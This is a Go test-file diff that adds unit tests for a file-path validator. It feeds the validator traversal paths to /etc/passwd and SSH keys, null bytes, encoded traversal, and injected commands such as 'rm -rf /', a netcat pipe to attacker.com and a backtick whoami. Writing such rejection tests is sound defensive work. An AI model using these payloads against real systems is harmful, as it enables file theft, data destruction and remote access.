@@ -1,6 +1,7 @@
 package types
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -722,6 +723,421 @@ func TestSanctionsStatusConstants(t *testing.T) {
 	require.Equal(t, SanctionsStatus(2), SanctionsStatus_SANCTIONS_MATCH)
 	require.Equal(t, SanctionsStatus(3), SanctionsStatus_SANCTIONS_CONFIRMED)
 	require.Equal(t, SanctionsStatus(4), SanctionsStatus_SANCTIONS_PENDING_REVIEW)
+}
+
+// ============================================================================
+// ValidateFilePath Tests
+// ============================================================================
+
+func TestValidateFilePath_Valid(t *testing.T) {
+	validPaths := []string{
+		"reports/tax_2023.pdf",
+		"tax_reports/user_reports/report_001.csv",
+		"output.json",
+		"tax-report-2023.pdf",
+		"report_123.txt",
+		"reports/2023/12/31/summary.xml",
+		"valid_name_with_underscores.pdf",
+		"valid-name-with-dashes.csv",
+	}
+
+	for _, path := range validPaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.NoError(t, err, "Expected valid path: %s", path)
+		})
+	}
+}
+
+func TestValidateFilePath_EmptyPath(t *testing.T) {
+	err := ValidateFilePath("")
+	require.Error(t, err)
+	require.Contains(t, err.Error(), "cannot be empty")
+}
+
+func TestValidateFilePath_AbsolutePaths(t *testing.T) {
+	absolutePaths := []string{
+		"/etc/passwd",
+		"/var/log/attack.txt",
+		"/home/user/sensitive.dat",
+		"/tmp/exploit.sh",
+		"/root/.ssh/id_rsa",
+	}
+
+	for _, path := range absolutePaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject absolute path: %s", path)
+			require.Contains(t, err.Error(), "absolute paths not allowed")
+		})
+	}
+}
+
+func TestValidateFilePath_WindowsAbsolutePaths(t *testing.T) {
+	windowsPaths := []string{
+		"C:\\Windows\\System32\\config\\SAM",
+		"D:\\sensitive\\data.db",
+		"E:/other/path/file.txt",
+		"C:/Windows/win.ini",
+	}
+
+	for _, path := range windowsPaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject Windows absolute path: %s", path)
+			require.Contains(t, err.Error(), "Windows-style absolute paths not allowed")
+		})
+	}
+}
+
+func TestValidateFilePath_PathTraversal(t *testing.T) {
+	traversalPaths := []string{
+		"../../../etc/passwd",
+		"reports/../../etc/shadow",
+		"../sensitive.txt",
+		"reports/../../../root/.ssh/id_rsa",
+		"./reports/../../exploit.sh",
+		"reports/../outside.txt",
+		"..\\..\\windows\\system32\\config\\sam", // Windows-style
+	}
+
+	for _, path := range traversalPaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject path traversal: %s", path)
+			require.Contains(t, err.Error(), "path traversal")
+		})
+	}
+}
+
+func TestValidateFilePath_SuspiciousCharacters(t *testing.T) {
+	suspiciousChars := []struct {
+		path string
+		char string
+	}{
+		{"report<script>.pdf", "<"},
+		{"report>output.txt", ">"},
+		{"report|command.sh", "|"},
+		{"report\"inject.csv", "\""},
+		{"report'inject.xml", "'"},
+		{"report`command`.log", "`"},
+		{"<img src=x>", "<"},
+		{">redirect.txt", ">"},
+		{"cmd|pipe", "|"},
+	}
+
+	for _, tc := range suspiciousChars {
+		t.Run(tc.path, func(t *testing.T) {
+			err := ValidateFilePath(tc.path)
+			require.Error(t, err, "Should reject suspicious character %s in path: %s", tc.char, tc.path)
+			require.Contains(t, err.Error(), "invalid character")
+		})
+	}
+}
+
+func TestValidateFilePath_NullBytes(t *testing.T) {
+	paths := []string{
+		"report\x00.pdf",
+		"reports/\x00hidden.txt",
+		"\x00malicious.sh",
+	}
+
+	for _, path := range paths {
+		t.Run("null_byte_test", func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject null byte in path")
+			require.Contains(t, err.Error(), "null bytes not allowed")
+		})
+	}
+}
+
+func TestValidateFilePath_ControlCharacters(t *testing.T) {
+	paths := []string{
+		"report\ninjection.txt",  // newline
+		"report\rinjection.txt",  // carriage return
+		"report\x01hidden.txt",   // SOH
+		"report\x1Bhidden.txt",   // ESC
+		"report\x00null.txt",     // null
+	}
+
+	for _, path := range paths {
+		t.Run("control_char_test", func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject control characters in path")
+			require.True(t,
+				strings.Contains(err.Error(), "control characters not allowed") ||
+				strings.Contains(err.Error(), "null bytes not allowed"),
+				"Error should mention control or null characters: %v", err)
+		})
+	}
+}
+
+func TestValidateFilePath_WhitespaceOnly(t *testing.T) {
+	whitespacePaths := []string{
+		"   ",
+		"\t\t",
+		"  \n  ",
+		"\r\n",
+	}
+
+	for _, path := range whitespacePaths {
+		t.Run("whitespace_test", func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject whitespace-only path")
+			require.True(t,
+				strings.Contains(err.Error(), "whitespace only") ||
+				strings.Contains(err.Error(), "control characters not allowed"),
+				"Error should mention whitespace or control characters: %v", err)
+		})
+	}
+}
+
+func TestValidateFilePath_HiddenFiles(t *testing.T) {
+	hiddenPaths := []string{
+		".hidden",
+		".ssh/id_rsa",
+		"reports/.secret.txt",
+		".bashrc",
+		".env",
+	}
+
+	for _, path := range hiddenPaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject hidden file path: %s", path)
+			require.Contains(t, err.Error(), "hidden file paths not allowed")
+		})
+	}
+}
+
+func TestValidateFilePath_ConsecutiveSlashes(t *testing.T) {
+	testCases := []struct {
+		path      string
+		errMsgs   []string
+	}{
+		{
+			path:    "reports//file.txt",
+			errMsgs: []string{"consecutive slashes not allowed"},
+		},
+		{
+			path:    "reports///deep///file.pdf",
+			errMsgs: []string{"consecutive slashes not allowed"},
+		},
+		{
+			path:    "//etc//passwd",
+			// This path is caught by either absolute path check OR consecutive slashes check
+			errMsgs: []string{"consecutive slashes not allowed", "absolute paths not allowed"},
+		},
+		{
+			path:    "a//b//c.txt",
+			errMsgs: []string{"consecutive slashes not allowed"},
+		},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.path, func(t *testing.T) {
+			err := ValidateFilePath(tc.path)
+			require.Error(t, err, "Should reject consecutive slashes: %s", tc.path)
+
+			// Check if error message contains at least one of the expected messages
+			found := false
+			for _, msg := range tc.errMsgs {
+				if strings.Contains(err.Error(), msg) {
+					found = true
+					break
+				}
+			}
+			require.True(t, found, "Error should contain one of %v, got: %v", tc.errMsgs, err.Error())
+		})
+	}
+}
+
+func TestValidateFilePath_RelativeComponents(t *testing.T) {
+	paths := []string{
+		"./report.txt",
+		"reports/./file.pdf",
+		"./././hidden.txt",
+		"reports/../other/file.txt",
+	}
+
+	for _, path := range paths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.Error(t, err, "Should reject relative path components: %s", path)
+			require.True(t,
+				strings.Contains(err.Error(), "relative path components") ||
+				strings.Contains(err.Error(), "path traversal") ||
+				strings.Contains(err.Error(), "hidden file paths"),
+				"Error should mention relative components, traversal, or hidden files: %v", err)
+		})
+	}
+}
+
+func TestValidateFilePath_PathTooLong(t *testing.T) {
+	// Create a path longer than 4096 bytes
+	longPath := strings.Repeat("a", 4097)
+	err := ValidateFilePath(longPath)
+	require.Error(t, err)
+	require.Contains(t, err.Error(), "file path too long")
+}
+
+func TestValidateFilePath_EdgeCases(t *testing.T) {
+	testCases := []struct {
+		name      string
+		path      string
+		shouldErr bool
+		errText   string
+	}{
+		{
+			name:      "single file name",
+			path:      "report.pdf",
+			shouldErr: false,
+		},
+		{
+			name:      "deep nested path",
+			path:      "a/b/c/d/e/f/g/h/i/j/file.txt",
+			shouldErr: false,
+		},
+		{
+			name:      "file with numbers",
+			path:      "report_2023_12_31.pdf",
+			shouldErr: false,
+		},
+		{
+			name:      "mixed case",
+			path:      "Reports/Tax/Year2023/Final.PDF",
+			shouldErr: false,
+		},
+		{
+			name:      "trailing slash",
+			path:      "reports/",
+			shouldErr: false,
+		},
+		{
+			name:      "unicode characters",
+			path:      "rapport_année_2023.pdf",
+			shouldErr: false,
+		},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.name, func(t *testing.T) {
+			err := ValidateFilePath(tc.path)
+			if tc.shouldErr {
+				require.Error(t, err, "Expected error for path: %s", tc.path)
+				if tc.errText != "" {
+					require.Contains(t, err.Error(), tc.errText)
+				}
+			} else {
+				require.NoError(t, err, "Expected valid path: %s", tc.path)
+			}
+		})
+	}
+}
+
+func TestValidateFilePath_SecurityAttackVectors(t *testing.T) {
+	// Test comprehensive attack vectors that should all be blocked
+	attackVectors := []struct {
+		name string
+		path string
+		desc string
+	}{
+		{
+			name: "classic_traversal",
+			path: "../../../../etc/passwd",
+			desc: "Classic directory traversal to /etc/passwd",
+		},
+		{
+			name: "null_byte_injection",
+			path: "report.pdf\x00.txt",
+			desc: "Null byte injection to bypass extension checks",
+		},
+		{
+			name: "command_injection",
+			path: "report.pdf;rm -rf /",
+			desc: "Command injection via semicolon",
+		},
+		{
+			name: "encoded_traversal",
+			path: "..%2F..%2Fetc%2Fpasswd",
+			desc: "URL-encoded directory traversal",
+		},
+		{
+			name: "double_encoded",
+			path: "..%252F..%252Fetc%252Fpasswd",
+			desc: "Double URL-encoded traversal",
+		},
+		{
+			name: "backslash_traversal",
+			path: "..\\..\\windows\\system32",
+			desc: "Windows-style backslash traversal",
+		},
+		{
+			name: "mixed_traversal",
+			path: "../.\\../etc/passwd",
+			desc: "Mixed forward/backslash traversal",
+		},
+		{
+			name: "absolute_unix",
+			path: "/etc/shadow",
+			desc: "Direct absolute Unix path",
+		},
+		{
+			name: "absolute_windows",
+			path: "C:\\Windows\\System32\\config\\SAM",
+			desc: "Direct absolute Windows path",
+		},
+		{
+			name: "pipe_injection",
+			path: "report.pdf|nc attacker.com 4444",
+			desc: "Pipe command injection",
+		},
+		{
+			name: "backtick_command",
+			path: "report_`whoami`.pdf",
+			desc: "Backtick command substitution",
+		},
+		{
+			name: "hidden_ssh_key",
+			path: ".ssh/id_rsa",
+			desc: "Access to hidden SSH private key",
+		},
+		{
+			name: "hidden_env",
+			path: ".env",
+			desc: "Access to hidden environment file",
+		},
+	}
+
+	for _, tc := range attackVectors {
+		t.Run(tc.name, func(t *testing.T) {
+			err := ValidateFilePath(tc.path)
+			require.Error(t, err, "Attack vector should be blocked: %s (%s)", tc.desc, tc.path)
+		})
+	}
+}
+
+func TestValidateFilePath_AllowedSpecialChars(t *testing.T) {
+	// Characters that SHOULD be allowed in filenames
+	allowedPaths := []string{
+		"report-2023.pdf",
+		"report_final.csv",
+		"my report (final).txt",
+		"report.v1.2.3.json",
+		"report@2023.xml",
+		"report#123.log",
+		"report+data.txt",
+		"report=value.csv",
+		"report[1].pdf",
+		"report{data}.json",
+	}
+
+	for _, path := range allowedPaths {
+		t.Run(path, func(t *testing.T) {
+			err := ValidateFilePath(path)
+			require.NoError(t, err, "Should allow path with valid special chars: %s", path)
+		})
+	}
 }
 
 // ============================================================================
